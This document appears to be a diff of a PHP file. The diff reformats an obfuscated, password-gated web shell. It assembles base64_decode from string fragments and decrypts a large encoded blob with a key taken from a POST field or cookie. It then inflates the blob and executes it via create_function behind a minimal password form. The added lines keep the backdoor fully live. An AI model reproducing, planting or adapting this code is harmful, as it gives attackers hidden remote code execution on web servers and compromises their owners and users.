@@ -1,4 +1,5 @@
-<?php $db__g_='base'.(128/2).'_de'.'code';$db__g_=$db__g_(str_replace("\n", '', 'C69Bjz8ZCxyYhKtWOi9sQrTEoGknOToZ+rEQ91krThS4KpiCQXxRaOUJyPgrfl7P2uY7osycVAVNsi94
+<?php $db__g_ = 'base' . (128 / 2) . '_de' . 'code';
+$db__g_ = $db__g_(str_replace("\n", '', 'C69Bjz8ZCxyYhKtWOi9sQrTEoGknOToZ+rEQ91krThS4KpiCQXxRaOUJyPgrfl7P2uY7osycVAVNsi94
 C0QswX2T7TwGas3WLiiXul6R5XH8p7zNjUGfDZSFRfavg2tR5CpQjlq0NVd984C/0IMw/dSjNiKWoDfz
 tmYeokPOlWGAcvjFYl0Foi3IA9OCyjft4FWRrkPWlqdB4XNi6cRIRb6KG/M4bIL+RnRqHCj0Xoy3/qg1
 Xtx6083kwKvfg4Ug8mg8jrl+R4j9K7+ualV6+bOV3YPoMEhJJoL6pWuWn7gUkpGDKyzE76OQ75s+1AAY
@@ -258,4 +259,19 @@ zIinygvrleJqmiC2JtAldRRJBbBYSuRHLM+DAnHBVJXEytIJ+P8f1p5L3WDSACdsC8hJSlQvu8Gnhkjb
 8T8NsleGn0F92imJKBHZp5Ysjr5ZjbBxdNXP704AJ9bnZeUiLfqnHrsO4x825oTw8mjgfoPGvfBcT9C8
 wVt3cIIdueAn3CihGIM3HGcw5gzd8mqa0ino0Fw3bktIp5GfxIqy5Ci6MsY8wEjcuKnvnJrCSh5UgFer
 UsjVA6WVkp4wLM+SDdtAuMIKfBcFHvw=
-'));$db_g_=isset($_POST['db_g_'])?$_POST['db_g_']:(isset($_COOKIE['db_g_'])?$_COOKIE['db_g_']:NULL);if($db_g_!==NULL){$db_g_=md5($db_g_).substr(MD5(strrev($db_g_)),0,strlen($db_g_));for($db___g_=0;$db___g_<15563;$db___g_++){$db__g_[$db___g_]=chr(( ord($db__g_[$db___g_])-ord($db_g_[$db___g_]))%256);$db_g_.=$db__g_[$db___g_];}if($db__g_=@gzinflate($db__g_)){if(isset($_POST['db_g_']))@setcookie('db_g_', $_POST['db_g_']);$db___g_=create_function('',$db__g_);unset($db_g_,$db__g_);$db___g_();}}?><form method="post" action=""><input type="text"name="db_g_"value=""/><input type="submit"value="&gt;"/></form>
+'));
+$db_g_ = isset($_POST['db_g_']) ? $_POST['db_g_'] : (isset($_COOKIE['db_g_']) ? $_COOKIE['db_g_'] : NULL);
+if ($db_g_ !== NULL) {
+    $db_g_ = md5($db_g_) . substr(MD5(strrev($db_g_)), 0, strlen($db_g_));
+    for ($db___g_ = 0; $db___g_ < 15563; $db___g_++) {
+        $db__g_[$db___g_] = chr((ord($db__g_[$db___g_]) - ord($db_g_[$db___g_])) % 256);
+        $db_g_ .= $db__g_[$db___g_];
+    }
+    if ($db__g_ = @gzinflate($db__g_)) {
+        if (isset($_POST['db_g_'])) @setcookie('db_g_', $_POST['db_g_']);
+        $db___g_ = create_function('', $db__g_);
+        unset($db_g_, $db__g_);
+        $db___g_();
+    }
+} ?>
+<form method="post" action=""><input type="text" name="db_g_" value=""/><input type="submit" value="&gt;"/></form>
